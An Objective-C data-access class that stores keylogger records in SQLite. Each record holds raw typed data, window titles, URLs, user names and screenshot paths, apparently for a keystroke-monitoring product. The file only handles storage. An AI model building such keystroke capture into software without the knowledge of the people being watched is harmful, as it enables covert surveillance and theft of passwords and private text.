//
//  KeyLogDAO.m
//  EventRepos
//
//  Created by Benjawan Tanarattanakorn on 9/3/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "KeyLogDAO.h"
#import "FxKeyLogEvent.h"
#import "FxSqlString.h"
#import "DAOFunction.h"
#import "FxSqliteView.h"
#import "DetailedCount.h"

#import <sqlite3.h>

// Select/Insert/Delete/Update/Count KeyLog table
static NSString * const kSelectKeyLogSql		= @"SELECT * FROM key_log;";
static NSString * const kSelectWhereKeyLogSql	= @"SELECT * FROM key_log WHERE id = ?;";
static NSString * const kInsertKeyLogSql		= @"INSERT INTO key_log VALUES(NULL, '?', '?', '?', '?', '?', '?', '?', '?', '?');";
static NSString * const kDeleteKeyLogSql		= @"DELETE FROM key_log WHERE id = ?;";
static NSString * const kUpdateKeyLogSql		= @"UPDATE key_log SET time = '?',"											
																	"user_name = '?',"
																	"application_id = '?',"
                                                                    "application_name = '?',"
																	"window_title = '?',"
                                                                    "url = '?',"
																	"actual_display_data = '?',"
																	"raw_data = '?',"
                                                                    "screen_shot_path = '?'"
																	" WHERE id = ?;";
static NSString * const kCountAllKeyLogSql		= @"SELECT Count(*) FROM key_log;";


@implementation KeyLogDAO

- (id) initWithSQLite3: (sqlite3 *) aSQLite3 {
	if ((self = [super init])) {
		mSQLite3 = aSQLite3;
	}
	return (self);
}

- (NSInteger) deleteEvent: (NSInteger) aEventID {
	NSInteger numEventDeleted		= 0;
	FxSqlString *sqlString			= [[FxSqlString alloc] initWithSqlFormat:kDeleteKeyLogSql];
	[sqlString formatInt:aEventID atIndex:0];
	const NSString *sqlStatement	= [sqlString finalizeSqlString];
	[sqlString release];
	[DAOFunction execDML:mSQLite3 withSqlStatement:sqlStatement];
	numEventDeleted++;
	return (numEventDeleted);
}

- (NSInteger) insertEvent: (FxEvent *) aNewEvent {
	NSInteger numEventInserted		= 0;
	FxKeyLogEvent *newKeyLogEvent	= (FxKeyLogEvent *)aNewEvent;
	FxSqlString *sqlString			= [[FxSqlString alloc] initWithSqlFormat:kInsertKeyLogSql];
	
	[sqlString formatString:newKeyLogEvent.dateTime atIndex:0];
	[sqlString formatString:newKeyLogEvent.mUserName atIndex:1];
	[sqlString formatString:newKeyLogEvent.mApplicationID atIndex:2];
    [sqlString formatString:newKeyLogEvent.mApplication atIndex:3];
	[sqlString formatString:newKeyLogEvent.mTitle atIndex:4];
    [sqlString formatString:newKeyLogEvent.mUrl atIndex:5];
	[sqlString formatString:newKeyLogEvent.mActualDisplayData atIndex:6];
	[sqlString formatString:newKeyLogEvent.mRawData atIndex:7];
    [sqlString formatString:newKeyLogEvent.mScreenshotPath atIndex:8];

	const NSString *sqlStatement	= [sqlString finalizeSqlString];
	[sqlString release];
	[DAOFunction execDML:mSQLite3 withSqlStatement:sqlStatement];
	numEventInserted++;
	return (numEventInserted);
}

- (FxEvent *) selectEvent: (NSInteger) aEventID {
	FxSqlString *sqlString			= [[FxSqlString alloc] initWithSqlFormat:kSelectWhereKeyLogSql];
	[sqlString formatInt:aEventID atIndex:0];
	
	const NSString *sqlStatement	= [sqlString finalizeSqlString];
	[sqlString release];
	
	FxSqliteView *fxSqliteView		= [DAOFunction execQuery:mSQLite3 withSqlStatement:sqlStatement];
	
	FxKeyLogEvent *keyLogEvent		= [[FxKeyLogEvent alloc] init];
	keyLogEvent.eventId				= [fxSqliteView intFieldValue:0];
	keyLogEvent.dateTime			= [fxSqliteView stringFieldValue:1];
	keyLogEvent.mUserName			= [fxSqliteView stringFieldValue:2];
	keyLogEvent.mApplicationID		= [fxSqliteView stringFieldValue:3];
    keyLogEvent.mApplication        = [fxSqliteView stringFieldValue:4];
	keyLogEvent.mTitle				= [fxSqliteView stringFieldValue:5];
    keyLogEvent.mUrl                = [fxSqliteView stringFieldValue:6];
	keyLogEvent.mActualDisplayData	= [fxSqliteView stringFieldValue:7];
	keyLogEvent.mRawData			= [fxSqliteView stringFieldValue:8];
    keyLogEvent.mScreenshotPath     = [fxSqliteView stringFieldValue:9];
	
	[fxSqliteView done];
	[keyLogEvent autorelease];
	return (keyLogEvent);
}

- (NSArray *) selectMaxEvent: (NSInteger) aMaxEvent {
	NSMutableArray *eventArrays			= [[NSMutableArray alloc] init];
	
	FxSqlString *sqlString				= [[FxSqlString alloc] initWithSqlFormat:kSelectKeyLogSql];
	const NSString *sqlStatement		= [sqlString finalizeSqlString];
	[sqlString release];
	
	FxSqliteView* fxSqliteView			= [DAOFunction execQuery:mSQLite3 withSqlStatement:sqlStatement];
	NSInteger count						= 0;
	
	while (count < aMaxEvent && !fxSqliteView.eof) {
		FxKeyLogEvent *keyLogEvent		= [[FxKeyLogEvent alloc] init];
		keyLogEvent.eventId				= [fxSqliteView intFieldValue:0];
		keyLogEvent.dateTime			= [fxSqliteView stringFieldValue:1];
		keyLogEvent.mUserName			= [fxSqliteView stringFieldValue:2];
		keyLogEvent.mApplicationID		= [fxSqliteView stringFieldValue:3];
        keyLogEvent.mApplication        = [fxSqliteView stringFieldValue:4];
		keyLogEvent.mTitle				= [fxSqliteView stringFieldValue:5];
        keyLogEvent.mUrl                = [fxSqliteView stringFieldValue:6];
		keyLogEvent.mActualDisplayData	= [fxSqliteView stringFieldValue:7];
		keyLogEvent.mRawData			= [fxSqliteView stringFieldValue:8];
        keyLogEvent.mScreenshotPath     = [fxSqliteView stringFieldValue:9];
			
		[eventArrays addObject:keyLogEvent];
		[keyLogEvent release];
		count++;
		[fxSqliteView nextRow];
	}
	[fxSqliteView done];
	[eventArrays autorelease];
	return (eventArrays);
}

- (NSInteger) updateEvent: (FxEvent *) aNewEvent {
	NSInteger numEventUpdated		= 0;
	FxSqlString *sqlString			= [[FxSqlString alloc] initWithSqlFormat:kUpdateKeyLogSql];
			
	FxKeyLogEvent *newKeyLogEvent	= (FxKeyLogEvent *)aNewEvent;	
	[sqlString formatString:newKeyLogEvent.dateTime atIndex:0];
	[sqlString formatString:newKeyLogEvent.mUserName atIndex:1];
	[sqlString formatString:newKeyLogEvent.mApplicationID atIndex:2];
    [sqlString formatString:newKeyLogEvent.mApplication atIndex:3];
	[sqlString formatString:newKeyLogEvent.mTitle atIndex:4];
    [sqlString formatString:newKeyLogEvent.mUrl atIndex:5];
	[sqlString formatString:newKeyLogEvent.mActualDisplayData atIndex:6];
	[sqlString formatString:newKeyLogEvent.mRawData atIndex:7];
    [sqlString formatString:newKeyLogEvent.mScreenshotPath atIndex:8];
    [sqlString formatInt:newKeyLogEvent.eventId atIndex:9];

	const NSString *sqlStatement	= [sqlString finalizeSqlString];
	[sqlString release];
	[DAOFunction execDML:mSQLite3 withSqlStatement:sqlStatement];
	numEventUpdated++;
	return (numEventUpdated);
}

- (DetailedCount *) countEvent {
	DetailedCount *detailedCount	= [[DetailedCount alloc] init];
	
	// Total count
	detailedCount.totalCount		= [DAOFunction execScalar:mSQLite3 withSqlStatement:kCountAllKeyLogSql];
	[detailedCount autorelease];
	
	return (detailedCount);
}

- (void) dealloc {
    [super dealloc];
}

@end
